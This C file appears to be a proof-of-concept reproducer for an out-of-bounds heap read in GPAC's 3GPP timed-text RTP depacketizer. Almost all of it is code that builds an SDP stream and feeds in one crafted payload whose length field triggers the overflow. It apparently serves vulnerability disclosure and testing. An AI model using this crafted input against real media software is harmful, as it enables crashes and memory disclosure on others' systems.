/*
 * PoC: OOB read in gf_rtp_parse_ttxt (3GPP timed-text RTP depacketizer).
 *
 * Drives the public GPAC RTP depacketizer API end-to-end:
 *   gf_rtp_depacketizer_new() configured for a "3gpp-tt" payload, then
 *   gf_rtp_depacketizer_process() with one crafted RTP payload.
 *
 * The crafted payload carries a single TTU with type==3 (text modifier) and an
 * advertised ttu_len equal to the whole RTP payload size. The depacketizer
 * copies ttu_len-6 bytes starting at payload+7, i.e. up to byte offset ttu_len,
 * which is one past the end of the payload buffer -> heap-buffer-overflow READ
 * under AddressSanitizer.
 */
#include <gpac/ietf.h>
#include <gpac/list.h>

static void on_sl_packet(void *udta, u8 *payload, u32 size, GF_SLHeader *hdr, GF_Err e)
{
	(void) udta; (void) payload; (void) size; (void) hdr; (void) e;
}

int main(int argc, char **argv)
{
	GF_SDPMedia *media;
	GF_RTPMap *map;
	GF_SDP_FMTP *fmtp;
	GF_X_Attribute *att;
	GF_RTPDepacketizer *rtp;
	GF_RTPHeader hdr;
	u8 *payload;
	u32 size = 16;
	u32 ttu_len = size; /* advertised size == full payload: triggers off-by-one */

	(void) argc; (void) argv;

	/* --- build an SDP media describing a 3GPP timed-text RTP stream --- */
	media = gf_sdp_media_new();
	media->Type = 3; /* text */

	map = (GF_RTPMap *) gf_malloc(sizeof(GF_RTPMap));
	memset(map, 0, sizeof(GF_RTPMap));
	map->PayloadType = 99;
	map->payload_name = gf_strdup("3gpp-tt");
	map->ClockRate = 1000;
	gf_list_add(media->RTPMaps, map);

	fmtp = gf_sdp_fmtp_new();
	fmtp->PayloadType = 99;
	att = (GF_X_Attribute *) gf_malloc(sizeof(GF_X_Attribute));
	memset(att, 0, sizeof(GF_X_Attribute));
	att->Name = gf_strdup("tx3g");
	att->Value = gf_strdup("AAAAAAAAAAAAAAAAAAAA");
	gf_list_add(fmtp->Attributes, att);
	gf_list_add(media->FMTP, fmtp);

	rtp = gf_rtp_depacketizer_new(media, 0, on_sl_packet, NULL);
	if (!rtp) {
		fprintf(stderr, "failed to create depacketizer\n");
		return 2;
	}

	/* --- craft a single TTU, type==3, ttu_len == payload size --- */
	payload = (u8 *) gf_malloc(size);
	memset(payload, 0, size);
	payload[0] = 0x03;                 /* is_utf16=0, reserved=0, type=3 */
	payload[1] = (u8) (ttu_len >> 8);  /* ttu_len high byte */
	payload[2] = (u8) (ttu_len & 0xff);/* ttu_len low byte  */
	/* bytes 3..6: nb/cur frag + 24-bit duration (any value) */

	memset(&hdr, 0, sizeof(GF_RTPHeader));
	hdr.TimeStamp = 0;
	hdr.Marker = 0;

	gf_rtp_depacketizer_process(rtp, &hdr, payload, size);

	gf_free(payload);
	gf_rtp_depacketizer_del(rtp);
	gf_sdp_media_del(media);
	return 0;
}
